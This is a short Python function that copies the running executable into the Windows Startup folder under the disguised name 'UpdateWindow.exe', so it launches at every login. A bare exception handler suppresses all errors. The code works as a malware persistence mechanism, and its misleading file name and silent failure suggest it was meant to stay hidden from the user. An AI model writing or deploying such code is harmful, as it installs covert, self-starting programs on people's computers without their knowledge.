import os
import sys
from pathlib import Path
import shutil

def path_manipulation():
    
 try:

    exe_file = Path(sys.executable) # provide path to the Python interpreter being used to run the script
  
    # full path to user start up folder
    start_up_folder = Path(os.environ['APPDATA']) /'Microsoft'/'Windows'/'Start Menu'/'Programs'/'Startup' 
    
    duplicate_exe_file = start_up_folder / "UpdateWindow.exe"
    
    # checking the folder, if the file is not present, copy it to the folder
    if not duplicate_exe_file.exists():
        
        shutil.copy2(exe_file, duplicate_exe_file)
        
 except:
    
    pass 
